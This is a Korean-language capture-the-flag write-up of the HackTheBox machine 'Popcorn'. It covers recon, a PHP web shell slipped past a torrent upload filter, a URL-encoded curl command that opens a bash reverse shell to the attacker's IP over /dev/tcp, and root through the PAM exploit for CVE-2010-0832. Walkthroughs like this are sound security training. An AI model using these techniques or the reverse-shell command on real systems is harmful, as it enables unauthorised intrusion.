# Popcorn -HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA popcorn 10.129.16.96
```
<img width="1105" height="413" alt="image" src="https://github.com/user-attachments/assets/b721b49c-3144-486b-88a0-99a5ca19d2a2" />

- SSH(22)
- HTTP(80)

<br>

- `/etc/hosts`에 `popcorn.htb` 추가.
<img width="1105" height="63" alt="image" src="https://github.com/user-attachments/assets/1043c809-a004-42bf-8f1f-07348502bfda" />

---
## HTTP
### banner grabbing
<img width="1105" height="315" alt="image" src="https://github.com/user-attachments/assets/22239515-2f3d-4ada-8011-6c7459030458" />

### gobuster
- `/torrent` 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://popcorn.htb -x php,md,txt -t 50
```
<img width="1105" height="484" alt="image" src="https://github.com/user-attachments/assets/68d7c654-2216-4299-9626-a9808a463721" />

### Upload Shell
- 계정을 생성하여 `Upload`에서 `torrent`확장자가 아닌 다른 파일을 업로드할 경우 오류 발생.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/33ceb4f9-723e-4dab-b1f9-73ea2d4b1522" />

<br>
<br>

- https://github.com/rsnitsch/py3createtorrent
- 스크립트를 사용하여 `torrent`파일 생성.
```bash
py3createtorrent -t best3 popcorn.nmap
```
<img width="1105" height="301" alt="image" src="https://github.com/user-attachments/assets/10980006-abcc-4485-b13a-fe5742914ae0" />

<br>
<br>

- 업로드 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/ce8a3bf4-df7f-43a1-a42c-780e95593ae6" />

<br>
<br>

- `Edit this torrent`를 클릭해서 스크린샷을 변경 가능.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/45128cc5-6bc2-4e14-84af-d4552115534b" />

<br>
<br>

- 서버에서 `php`를 사용 중.
- `burpsuite`로 스크린샷 업로드를 가로채서 웹 셸 코드로 바꿔서 업로드 시도하여 성공.
<img width="1548" height="512" alt="image" src="https://github.com/user-attachments/assets/2387138c-d341-40a2-8e65-e9fad5cb9385" />

<br>
<br>

- 업로드 된 스크린샷으로 이동.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/6d0f3f86-62d2-4f2e-9ece-55b5aafe487b" />

<br>
<br>

- 명령어 실행 성공.
<img width="841" height="81" alt="image" src="https://github.com/user-attachments/assets/94754010-eca2-4a5f-b1c8-7ace0c28ca88" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://popcorn.htb/torrent/upload/e39d1c4953fb786f9a093eac44859ea36ec1790c.php/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22'
```
<img width="1103" height="61" alt="image" src="https://github.com/user-attachments/assets/8c3caa76-ffde-4f01-b1eb-074c7f39fdb0" />

<br>
<br>

- 셸 획득.
<img width="1103" height="161" alt="image" src="https://github.com/user-attachments/assets/c70f03b2-c011-4a9a-beaf-05773da24122" />

---
## Privesc
- 특별한 정보를 찾을 수 없으나 `george` 폴더로 이동이 가능.
<img width="1103" height="231" alt="image" src="https://github.com/user-attachments/assets/2f8eb49b-384f-46c1-a990-7b7a200415c9" />

<br>
<br>

- `george`유저로 소유 된 파일 중 `motd.legal-displayed` 발견.
```bash
find / -user george 2>/dev/null
```
<img width="1103" height="214" alt="image" src="https://github.com/user-attachments/assets/9f7c664e-7beb-43bd-9a1f-0317584571ab" />

### CVE-2010-0832
- https://nvd.nist.gov/vuln/detail/CVE-2010-0832
<img width="1226" height="430" alt="image" src="https://github.com/user-attachments/assets/e18e1c7a-48b9-4bfc-a2c8-fa676aa91814" />

<br>
<br>

- `PAM 1.1.0` 버전일 경우 침투 가능.
<img width="1103" height="204" alt="image" src="https://github.com/user-attachments/assets/d1187e20-683f-498c-9c2c-b3aaed89b37a" />

<br>
<br>

- `PAM 1.1.0` 버전 확인.
```bash
dpkg -l|grep -i pam
```
<img width="1103" height="147" alt="image" src="https://github.com/user-attachments/assets/b5df357f-9aa8-45d4-b1b2-9e1f6ed8843d" />

<br>
<br>

- 스크립트 실행하여 `root` 획득.
```bash
searchsploit -m 14339
```
<img width="1104" height="234" alt="image" src="https://github.com/user-attachments/assets/e2836017-38f0-46e5-b892-7a8f8adf10c7" />

## FLAG
- `/home/george/user.txt`
<img width="1104" height="234" alt="image" src="https://github.com/user-attachments/assets/10385f27-14dd-489d-aa49-bd217233201d" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="211" alt="image" src="https://github.com/user-attachments/assets/d1aeb639-e122-43d7-997b-16b1e42fcd6b" />
